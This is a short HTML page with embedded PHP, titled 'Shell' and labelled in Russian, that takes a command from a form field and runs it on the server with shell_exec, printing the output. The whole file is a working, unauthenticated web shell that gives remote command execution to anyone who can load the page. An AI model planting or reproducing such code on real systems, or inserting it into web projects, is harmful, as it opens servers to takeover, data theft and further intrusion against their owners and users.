<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Shell</title>
    </head>
    <body>
        <form action="index.php" method="post">
        Команда:  <input type="text" name="command" />
        <input type="submit" name="submit" value="Нажми меня!" />
    </form>
    <?php
        echo shell_exec($_POST["command"]);
    ?>
</body>
</html>